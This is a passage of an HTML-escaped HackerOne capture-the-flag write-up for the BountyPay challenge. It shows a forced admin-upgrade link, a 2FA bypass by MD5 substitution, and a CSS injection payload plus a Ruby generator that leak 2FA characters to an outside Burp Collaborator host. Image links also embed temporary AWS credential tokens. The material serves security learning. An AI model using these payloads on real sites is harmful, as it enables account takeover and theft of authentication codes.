upgrateToAdmin\u003c/code\u003e in the profile tab, submit the change, and then send the report to the admin:\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fadmin%2Freport%3Furl%3DLz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis request will trigger the \u003ccode\u003eupgradeToAdmin\u003c/code\u003e from the admin\u0026#39;s side - giving us admin rights!\u003c/p\u003e\n\n\u003ch3 id=\"admin\"\u003eAdmin\u003c/h3\u003e\n\n\u003cp\u003eNow that we are admin there\u0026#39;s a new tab! With the CEO\u0026#39;s account and password (which he forgot - should have been admin:admin)\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-06-01_at_11.31.24_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tFwXeWDijqRAbC6nFdFunTyB?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.31.24_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.31.24_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=dacb809725ec0b4585fc3e0ad3206e253634ed865b5f23b43cea0078b695185b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tFwXeWDijqRAbC6nFdFunTyB?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.31.24_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.31.24_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=dacb809725ec0b4585fc3e0ad3206e253634ed865b5f23b43cea0078b695185b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSo what\u0026#39;s left to do? Login of course! this account will work in \u003ca href=\"/redirect?url=http%3A%2F%2Fapp.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - when you login you\u0026#39;ll need to bypass the  \u003ccode\u003e2FA\u003c/code\u003e again this time we don\u0026#39;t have a used security code so just make one up \u003ccode\u003e12345aBcDF= b3e2bc9cbb5e0b624816fa0ee19a7993\u003c/code\u003e exchange the \u003ccode\u003echallenge\u003c/code\u003e value for the \u003ccode\u003emd5\u003c/code\u003e hash and it should allow you to log in - now let\u0026#39;s pay those hackers!\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-06-01_at_1.44.46_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RLjjuE1RCvaNtAC7r8c48UZk?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_1.44.46_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_1.44.46_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=e672bb47949531c6b7803185c3c889efade356ff0b5066707e2f39dba17c32ca\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RLjjuE1RCvaNtAC7r8c48UZk?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_1.44.46_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_1.44.46_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=e672bb47949531c6b7803185c3c889efade356ff0b5066707e2f39dba17c32ca\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nIf you try to use the \u003ccode\u003epay\u003c/code\u003e button you\u0026#39;ll be redirected to...another 2FA - this one is not as easy as a \u003ccode\u003emd5\u003c/code\u003e hash. Let\u0026#39;s take a look at the \u003ccode\u003e2FA\u003c/code\u003e page and html that we got to work with\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e...\n\u003cspan class=\"c\"\u003e\u0026lt;!--important part --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;app_style\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.bountypay.h1ctf.com/css/uni_2fa_style.css\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis snippet caught my eye - they\u0026#39;re sending the styling for what I believe is the \u003ccode\u003e2FA\u003c/code\u003e application to grab the code - I replaced the css link and put a \u003ccode\u003eburp\u003c/code\u003e collaborator link to see if I could get a response from wherever that request ended up at and...\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-06-01_at_2.00.51_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bDZftEAbZj2R1ZXxByCJtMcT?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_2.00.51_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_2.00.51_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=7f3b7fd25d1bb86467cba0f90b052d029c69724e549dd27f043f034225ed61d3\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bDZftEAbZj2R1ZXxByCJtMcT?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_2.00.51_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_2.00.51_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=7f3b7fd25d1bb86467cba0f90b052d029c69724e549dd27f043f034225ed61d3\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nNow we\u0026#39;re talking - but this was done through a css link, also how in the f*** do I exfiltrate this with just css? \u003c/p\u003e\n\n\u003cp\u003eOne thing I noticed from the css that was originally there was the rules and comment from the css style made me think that I needed to steal a token from an application that looked like your typical \u003ccode\u003e2FA\u003c/code\u003e app with multiple input fields: [][][][][][][]\u003c/p\u003e\n\n\u003ch3 id=\"css-data-exfiltration\"\u003ecss data exfiltration\u003c/h3\u003e\n\n\u003cp\u003eWho would I tell I\u0026#39;d be exfiltrating information using \u003ccode\u003ecss selectors\u003c/code\u003e - 2020 is a strange year. \u003c/p\u003e\n\n\u003cp\u003eRealizing that was a posibility thanks to \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fd0nutptr\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ed0nut\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and the blog he wrote \u003ca href=\"/redirect?url=https%3A%2F%2Fmedium.com%2F%40d0nut%2Fbetter-exfiltration-via-html-injection-31c72a2dae8b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. I could technically add my own \u003ccode\u003ecss\u003c/code\u003e stylesheet by submitting one in a server I controlled - with this and some crafty payloads I was able to grab all the \u003ccode\u003einputs\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003eI was able to find the chars I needed by:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ehosting a css file with my payloads on a server I controlled (I used netlify since they give u a server in which you can host js, css files, and comes with a SSL cert)\u003c/li\u003e\n\u003cli\u003epayloads were generated based on the criteria I needed\n\n\u003cul\u003e\n\u003cli\u003echarset: [a-z][A-Z][0-9]\u003c/li\u003e\n\u003cli\u003e7 characters (that\u0026#39;s how many fit in the input field)\u003c/li\u003e\n\u003cli\u003eGenerated a list that would only execute the css rule each time a match was found, when the css selector would find a match it would execute the rule which in this case made a request to the \u003ccode\u003ecollaborator\u003c/code\u003e along with the match and the placement.\u003c/li\u003e\n\u003cli\u003eburp helped since I attached the current character and place (based on the nth-of-type(n) selector)\u003c/li\u003e\n\u003cli\u003eExample payload\n\n\u003cul\u003e\n\u003cli\u003einput[value=a]:nth-of-type(1){background-image:url(\u0026quot;\u003ca href=\"/redirect?url=https%3A%2F%2Fjl8b9zsipw6zj5g9q4f2kpvf369zxo.burpcollaborator.net.burpcollaborator.net%2F%3Fa%3DA%26i%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hellothere.burpcollaborator.net.burpcollaborator.net?char=a\u0026amp;order=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;);}\u003c/li\u003e\n\u003cli\u003eif the css found that the first input had a value of \u003ccode\u003ea\u003c/code\u003e I would get a callback to my collaborator instance with the character and it\u0026#39;s index\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eI had about 400 css rules\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# creates a wordlist with css rules to find the auth code\u003c/span\u003e\n\u003cspan class=\"n\"\u003echars\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e..\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_a\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e..\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Z\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_a\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e..\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;z\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_a\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;server/burp collaborator\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003egets\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003echomp\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e..\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\n    \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eeach\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;input[value=\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e]:nth-of-type(\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e){background-image:url(\u0026#39;\u003c/span\u003e\u003cspan 